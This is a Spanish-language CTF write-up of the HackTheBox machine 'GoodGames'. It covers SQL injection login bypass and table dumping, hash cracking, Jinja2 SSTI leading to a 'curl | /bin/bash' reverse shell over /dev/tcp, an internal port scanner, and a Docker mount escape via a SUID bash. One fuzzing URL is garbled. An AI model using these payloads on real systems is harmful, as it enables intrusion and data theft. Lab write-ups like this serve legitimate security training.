---
title: GoodGames
published: true
categories: [Linux,Easy]
tags: [Web explotation, SQLi, SSTI, Docker scape]
author: Kripteria
image:
  path: https://user-images.githubusercontent.com/55555187/155879645-918f5bb0-dc2a-4d71-8b16-869c93a540e6.PNG
  lqip: data:image/webp;base64,UklGRpoAAABXRUJQVlA4WAoAAAAQAAAADwAABwAAQUxQSDIAAAARL0AmbZurmr57yyIiqE8oiG0bejIYEQTgqiDA9vqnsUSI6H+oAERp2HZ65qP/VIAWAFZQOCBCAAAA8AEAnQEqEAAIAAVAfCWkAALp8sF8rgRgAP7o9FDvMCkMde9PK7euH5M1m6VWoDXf2FkP3BqV0ZYbO6NA/VFIAAAA

---

GoodGames es una <font color="#98E256">máquina Easy</font> de temática <font color="#D35400">Linux</font> que toca reconocimiento y fuzzing de un servicio web, SQL Inyection, bypass de restricciones con Burpsuite, explotación de SSTI y escapada de un contenedor docker como root abusando de monturas.

## Reconocimiento

### Nmap

Una vez que la máquina está activa empezamos la fase de reconocimiento de puertos con Nmap.

Identificamos los puertos abiertos de la máquina

```
nmap -p- --open -sS --min-rate 10000 -Pn -n -vvv 10.10.11.130 -oN portScan
```

Obteniendo:

<img src="https://user-images.githubusercontent.com/55555187/155849554-86ef55f6-2ec7-4bc2-9a92-41b30117172f.PNG" title="" alt="recon1" width="356">

Identificamos la versión y el servicio corriendo en los puertos reportados en el escaneo anterior.

```
nmap -sVC -p80 10.10.11.130 -vvv -oN portSV 
```

<img title="" src="https://user-images.githubusercontent.com/55555187/155849555-2071c79f-fac1-4150-9fe8-bdd372b3a4d4.PNG" alt="recon2" width="611">

### Whatweb

Whatweb es una utilidad que nos permite identificar las tecnologías web utilizadas en una página web.

Sabiendo que la máquina tiene un servicio web alojado en el puerto 80 (HTTP) utilizaremos whatweb para obtener información de las tecnologías web que utilizan.

```
whatweb 10.10.11.130
```

Obteniendo:

![recon3](https://user-images.githubusercontent.com/55555187/155849556-fc35235d-a8c9-4526-8411-e224b11f098c.PNG)

Me llama la atención "Werkzeug 2.0.2" por lo que decido buscar posibles exploits pero no encuentro nada.

### Reconocimiento del contenido de la web

Si accedemos al servicio http de la máquina observamos que estamos ante un portal de venta de videojuegos similar a steam.

![web](https://user-images.githubusercontent.com/55555187/155849859-a3ca7aa1-b66e-4b3f-ba1c-a4b48b4a568a.PNG)

Pulsando en el icono de la parte superior me sale un formulario de login, como no tengo una cuenta le doy a sign up y me intento crear una.

![login](https://user-images.githubusercontent.com/55555187/155849968-a8e3c860-f82e-40e9-876c-3206bde8db4f.PNG)

![recon7](https://user-images.githubusercontent.com/55555187/155849560-03e17578-6691-4de1-950f-a237d9b11d92.PNG)

Pero por algún motivo obtengo un error del servidor.

<img title="" src="https://user-images.githubusercontent.com/55555187/155849561-57e1660e-8c72-41f4-97b4-6d490d3ca25e.PNG" alt="recon8" width="346">

Viendo que no me puedo registrar intento ver si puedo hacer **bypass del login** a través de una **inyección SQL**.

<img src="https://user-images.githubusercontent.com/55555187/155849563-d6915146-c8b9-4d81-a86a-d6affe8ac17c.PNG" title="" alt="recon10" width="445">

Pero parece ser que los datos del login son filtrados antes de tramitarse la petición POST.

Pruebo a lanzar la inyección desde **Burp suite**.

1- Activo el proxy para burp suite a través de foxyproxy.

2- Lanzo una petición correcta.

<img title="" src="https://user-images.githubusercontent.com/55555187/155849562-299e01b8-97e5-42e0-967a-3a432dca7109.PNG" alt="recon9" width="375">

3- Mando la petición al **responder** con CTRL + R y empiezo a probar payloads.

<img title="" src="https://user-images.githubusercontent.com/55555187/155849564-c336a420-9682-4815-9055-5b34ded0b59f.PNG" alt="recon11" width="598">

Parece ser que he logrado bypassear el login ya que parece que se está definiendo una **cookie de sessión**.

Si miramos más abajo en la respuesta encontramos lo siguiente:

![recon12](https://user-images.githubusercontent.com/55555187/155849565-b9ddb5c7-999c-462a-8bc5-9602313c7da4.PNG)

(Normalmente pondría Welcome admin pero alguién le ha cambiado el nombre x) ) 

Hacemos forward a la petición y obtenemos lo siguiente:

<img src="https://user-images.githubusercontent.com/55555187/155849566-ef89bbe3-c234-4e96-bc75-8eb76f67f032.PNG" title="" alt="recon13" width="537">

Una vez hemos entrado como administrador observamos lo siguiente:

![lobby](https://user-images.githubusercontent.com/55555187/155850368-75555bf8-4676-4db4-8935-029c28bee767.PNG)

Si accedemos a los ajustes a través del icono de la parte superior derecha encontramos lo siguiente:

<img src="https://user-images.githubusercontent.com/55555187/155849568-53ea735d-da3b-4247-9a56-b9d6ec649409.PNG" title="" alt="recon14" width="579">

Metemos la url en /etc/hosts y recargamos la página:

<img src="https://user-images.githubusercontent.com/55555187/155849570-b89ab14c-14f1-4b02-b501-2a2aef5bc143.PNG" title="" alt="recon15" width="506">

Como no tenemos credenciales válidas por que hemos entrado bypasseando el login no podemos hacer nada por el momento.

Si utilizamos whatweb sobre el nuevo dominio obtenemos lo siguiente:

![recon17](https://user-images.githubusercontent.com/55555187/155849572-6a529e28-d0ed-419a-80c5-19605278dd1c.PNG)

Cosa que no nos reporta nada útil.

Si accedemos al perfil de la web anterior observamos lo siguiente:

![recon16](https://user-images.githubusercontent.com/55555187/155849571-c85bf998-0eaa-4e71-94a8-e00bf09fce82.PNG)
Por lo que tampoco podemos hacer nada por aquí.

### Wfuzz

Probamos a fuzzear ambos dominios:

```
wfuzz -c --hc=404 -t 500 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt  http://Active directory explotation-administration.goodgames.htb/FUZZ
```

<img src="https://user-images.githubusercontent.com/55555187/155850594-7121e80f-5e11-4dfa-8425-4deea840d6c6.PNG" title="" alt="recon4" width="514">

Tenemos mucho ruido que nos oculta los directorios accesibles por lo que **filtro todas las respuestas con 9265 Chars**.

```
wfuzz -c --hc=404 --hh 9265 -t 500 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt  http://Active directory explotation-administration.goodgames.htb/FUZZ
```

<img src="https://user-images.githubusercontent.com/55555187/155850593-13064a7d-440e-464d-8661-4f6cb8c7e35a.PNG" title="" alt="recon5" width="542">

No obtenemos nada útil.

## Obtención de acceso

### Explotando la inyección SQL

Viendo que no hay nada más que podamos hacer, decido explotar la **inyección SQL** que usé para bypassear el login para ver si puedo hacerme con algunas credenciales.

Para explotar la inyección seguiré los siguientes pasos:

#### Paso 1 - identificación de número de columnas

Intento obtener el número de columnas de la tabla que está utilizando el login. 

Para ello me hago uso de **order by** y del **tamaño de la respuesta**.

<img src="https://user-images.githubusercontent.com/55555187/155851097-6be48c45-0211-462b-a99c-8d883dc67d9f.PNG" title="" alt="err" width="447">    

<img src="https://user-images.githubusercontent.com/55555187/155849574-cf800d27-3863-4768-ae1b-158c9d906d5f.PNG" title="" alt="acc1" width="510">

Observamos que con 4 obtenemos un tamaño de respuesta diferente por lo que la tabla en uso es de 4 columnas.

#### Paso 2 - Identificación de la base de datos

El siguiente paso consiste en identificar la base de datos sobre la que se están realizando las peticiones. Utilizamos la función **database()**.

<img src="https://user-images.githubusercontent.com/55555187/155849576-fb22ef56-268e-4ca1-b4f0-f4ec190187b6.PNG" title="" alt="acc2" width="549">

La base de datos tiene de nombre "**main**".

#### Paso 3 - Identificación de las tablas de la base de datos

Lo siguiente que debemos hacer es identificar las tablas que contiene la base de datos "main".

```
union select 1,2,3,table_name from information_schema.tables where table_schema="main"-- -
```

![acc4](https://user-images.githubusercontent.com/55555187/155849579-0223236b-0484-4cc4-9fcf-adf895697abc.PNG)
Observamos que contiene las tablas:

- blog.

- blog_comment.

- user.

#### Paso 4 - Identificar las columnas de la tabla user

```
union select 1,2,3,column_name from information_schema_columns where table_schema="main" and table_name="user"-- -
```

<img title="" src="https://user-images.githubusercontent.com/55555187/155849581-270e3c72-99a6-4f28-a608-98ecffc3e227.PNG" alt="acc6" width="671">
Observamos que contiene las columnas:

- id.

- email.

- password.

- name.

#### Paso 5 - Obtener el contenido de la tabla user

Para mostrar el contenido de la tabla user utilizo el método **group_concat** que concatena en una cadena los parámetros que le pasemos.

Nota: **0x3a** es ":" en hexadecimal. Se puede hacer también escapando las comillas \":\" 

```
union select 1,2,3,group_concat(name,0x3a,password,0x3a,email) from user-- -
```

![acc7](https://user-images.githubusercontent.com/55555187/155849582-5e57e6fe-b242-4f38-a12d-fea36445555a.PNG)
Nos quedamos con el primer resultado que es el más prometedor al tener como email @goodgames.htb.

```
admin:2b22337f218b2d82dfc3b6f77e7cb8ec:admin@goodgames.
```

### Crackeo del hash

Mediante **hash-identifier** identificamos el tipo de hash ante el que nos encontramos:

![acc8](https://user-images.githubusercontent.com/55555187/155849583-7c98524f-9ddd-4433-9873-4abe5c45ca90.PNG)

Crackeamos el hash utilizando **John the ripper** y el diccionario **rockyou**.

```
john hash.txt --wordlists /usr/share/wordlists/rockyou.txt --format=Raw-MD5
```

![acc9](https://user-images.githubusercontent.com/55555187/155849584-9ab1d23f-67fa-401e-ba0d-7ae80301230e.PNG)

Y obteniendo como contraseña: **superadministrator**

Nos logueamos en el segundo dominio como *admin:superadministrator* y obtenemos lo siguiente:

![dom2](https://user-images.githubusercontent.com/55555187/155851767-8e2f2fee-f94f-4511-b07d-65ba1c65394b.PNG)

Trás investigar la web veo que puedo crear un usuario a través de settings:

![dom22](https://user-images.githubusercontent.com/55555187/155851804-01bc98ec-3d78-4493-a344-e82aa9a7bf73.PNG)

### Explotando SSTI (Server Side Template Injection)

Tras investigar durante un tiempo e informarme sobre la vulnerabilidad [SSTI](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection) realizo  una prueba para ver si la web es vulnerable.

Introduzco en el campo nombre &#123;&#123; 7 * 7 &#125;&#125;, si muestra 49 entonces es vulnerable a SSTI:

<img src="https://user-images.githubusercontent.com/55555187/155852025-dbd0c7aa-616f-49ed-9ddd-a9de5f9cf033.PNG" title="" alt="ssti" width="413">

Esto ocurre cuando la vista utiliza motores de plantillas y uno de los campos es generado a partir de la entrada no sanitizada del usuario.

Una forma de comprobar ante que motor de plantillas estamos es mediante este test:

<img src="https://user-images.githubusercontent.com/55555187/155877397-d3c06ddf-29dc-47b2-bf2e-c795be543079.png" title="" alt="image" width="508">

En nuestro caso nos encontramos ante un **Jinja2** o un **Twig**.

Sabiendo que nos encontramos ante Jinja2 o Twig lo que hago es ir a [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings) y buscar payloads de ejecución remota de comandos.

Pruebo a obtener el ID del usuario que está ejecutando el servicio:

{% raw %}
```
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}
```
{% endraw %}

<img src="https://user-images.githubusercontent.com/55555187/155877552-94c62f5c-fccf-4440-9768-51ffd1cd129f.PNG" title="" alt="recon18" width="355">

Una vez que veo que podemos ejecutar comandos intento entablarme una **reverse shell**.

1- Creo un archivo index.html con el siguiente contenido en mi directorio de trabajo:

```bash
#!/bin/bash

bash -i >& /dev/tcp/10.10.14.121/443 0>&1
```

2- Me pongo en escucha por el puerto 443 con netcat

```
nc -nvlp 443
```

3- Levanto un servidor con python por el puerto 80 en el directorio actual de trabajo:

```
python3 -m http.server 80
```

3- Lanzo el siguiente comando en la web:

{% raw %}
```
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('curl http<span>://</span>10.10.14.121 | /bin/bash').read() }}
```
{% endraw %}

Cuando se haga el **curl** sobre el servidor http<span>://</span>10.10.14.121, lo que hará la máquina víctima es **obtener el contenido de index.html** que en este caso es un script en bash que nos entablará una reverse shell.

Al hacer **| /bin/bash** lo que hacemos es que el contenido de **index.html sea interpretado por la bash** haciendo que el comando se ejecute.

![privesc1](https://user-images.githubusercontent.com/55555187/155877589-b9be301e-bac3-4618-a9a3-90a8671c6b38.PNG)

A través del comando hostname -i descubro que estamos dentro de un contenedor.

### Tratamiento de la tty

Realizo un tratamiento de la tty para tener una shell interactiva y en la que pueda trabajar cómodamente. Para ello lanzo los siguientes comandos:

#### Tratamiento básico

```
script /dev/null -c bash
ctrl + z
stty raw -echo; fg
reset
xterm
export XTERM=xterm
export SHELL=bash
```

#### Escalado de editores de texto

```
stty -a (En una terminal de nuestro equipo para ver los valores de 
            columns y rows)

stty rows [rows] columns [columns]
```

Esto último es para que al abrir nano o algún editor en la máquina víctima nos salga bien escalado en la terminal.

## Escalado de privilegios

Navegando por el contenedor descubro el directorio **/home** del usuario **augustus**, directorio que contiene la primera flag.

![privesc2](https://user-images.githubusercontent.com/55555187/155877590-58760783-6b0d-4d10-b89d-541116a509d5.PNG)

- Compruebo si el usuario augustus está en el **/etc/passwd** del contenedor, pero no está.

- También me llama la atención que **el grupo propietario de la flag** sea el grupo **1000**, compruebo si existe en el contenedor y no existe.

Esto me hace suponer que el directorio **/home/augustus es una montura de la máquina principal en el contenedor**.

Como no encuentro nada relevante en el contenedor investigo un poco sobre **Docker breakouts** y me entero de que el contenedor se suele conectar a la máquina víctima a través de una **interfaz** (tiene todo el sentido del mundo pero no se me había ocurrido).

A través del comando **route -n** descubro la interfaz **172.19.0.1** de la máquina víctima abierta.

Intento enumerar puertos abiertos para esa interfaz. 

Aunque el primer escaneo con Nmap nos haya reportado que solo el 80 está abierto, puede ocurrir que tenga **puertos abiertos a nivel interno** solamente.

Como en el contenedor no tenemos Nmap, me construyo un script en Bash buscando información por internet.

[Uso de /dev/tcp para establecer conexiones TCP desde bash](http://systemadmin.es/2012/06/uso-de-devtcp-para-conexiones-tcp-desde-bash)

```bash
#!/bin/bash

function ctrl_c(){
    echo -e "\n\n Saliendo \n"
    tput cnorm
    exit 1
}

#Siempre que haga Ctrl + c (señal SIGINT) llamo a la función ctrl_c
trap ctrl_c INT

#Escondo el puntero
tput civis

#Si mando una cadena a un puerto abierto, este me devuelve un código de
#estado 0, si está cerrado me devuelve un código de estado 1
for port in $(seq 1 65535); do
    bash -c "echo '' > /dev/tcp/172.19.0.1/$port" 2>/dev/null && echo "[!] Puerto $port abierto" &
done; wait 

#Muestro el puntero
tput cnorm
```

Nos pasamos el programa al contenedor usando base64, le damos permisos de ejecución y lo ejecutamos.

![privesc3](https://user-images.githubusercontent.com/55555187/155878216-11e2188b-bde5-4198-a374-2ef9b93860bf.PNG)

Como tiene ssh abierto pruebo a **reutilizar contraseñas** con augustus

```
augustus:superadministrator
```

Y entramos.

**Nota importante:** La escalada de privilegios que mostraré a continuación explica paso a paso como obtener root pero en las capturas no se hace correctamente (bash tiene 0 bytes de tamaño) debido a que la máquina tenía un % de uso de disco del 100% lo cual impedía ejecutar el exploit correctamente.

Probé con las máquinas de todos los servidores y por desgracia todas estaba igual ya que al ser una máquina retired no te dejan resetearla sin tener un plan de pago :L

Una vez que hemos accedido al sistema hacemos un reconocimiento básico:

- Mediante el comando **id** miramos si estamos en algún grupo interesante.

- Utilizando **sudo -l** comprobamos si tenemos permisos de sudo en algún contexto.

- Con **find / -perm /4000 2>/dev/null** comprobamos si existe *permisos SUID* que podamos explotar.

- Miramos la versión del kernel mediante **uname -a** para ver si es vulnerable a *dirty cow*.

Ejecuto **pspy** para ver si hay alguna tarea Cron de la que pueda aprovecharme, pero no encuentro nada.

Tras un buen rato de investigación y volviendo a Docker breakout me encuentro con que **la montura de augustus en el Docker supone una vulnerabilidad crítica** ya que podemos modificarla desde ambos lados.

Para explotar esto hago lo siguiente:

1- Copio /bin/bash al directorio de augustus. 

![privesc4](https://user-images.githubusercontent.com/55555187/155878224-2d99b8f8-181d-41d1-8d47-e3430468a7af.PNG)
Al estar montado en el contenedor, este cambio se verá reflejado también ahí.

![privesc5](https://user-images.githubusercontent.com/55555187/155878235-afd2dfbf-e761-4a65-801f-a86a3e1c38f8.PNG)

2- Le asigno a la bash root como usuario y grupo propietarios y le otorgo permisos SUID.

![privesc7](https://user-images.githubusercontent.com/55555187/155878239-69495753-d681-49af-9b27-c225e6a29673.PNG)

3- Vuelvo al usuario augustus y observo que la bash mantiene los permisos SUID por lo que con ./bash -p podemos obtener una shell como root.

![privescfinal](https://user-images.githubusercontent.com/55555187/155878248-1f50a9f3-1a28-4c41-af55-4e783a6cd7fa.PNG)
